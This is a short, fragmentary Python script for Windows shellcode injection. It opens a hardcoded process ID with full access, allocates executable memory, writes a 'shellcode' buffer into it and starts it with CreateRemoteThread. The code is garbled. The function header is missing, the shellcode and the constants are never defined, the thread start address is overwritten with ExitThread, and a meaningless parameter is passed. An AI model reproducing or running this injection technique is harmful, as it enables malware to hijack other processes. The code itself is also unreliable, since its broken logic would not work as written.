xxxxxxxxxxxxxxxxxxxxxxxx
from ctypes import *
import time

kernel32                = windll.kernel32



    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, pid )
    if not h_process:
        print(f"[*] Couldn't acquire a handle to PID: {pid}")
        exit(0)

    arg_address = kernel32.VirtualAllocEx( h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    print(f"[*] Allocated shellcode address: 0x{arg_address:08x}")

    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))


    
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    start_address  = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")
    start_address  = kernel32.GetProcAddress(h_kernel32,"ExitThread")
    parameter = 11


    thread_id = c_ulong(0)
    if not kernel32.CreateRemoteThread(h_process,None,0,start_address,parameter,0,byref(thread_id)):
        print("[*] Failed to inject the DLL. Exiting.")
        exit(0)

    return True



# processid = create_process()
# time.sleep(2)
processid = 1936
inject( processid, shellcode.encode(encoding='latin1') )
print('done!')



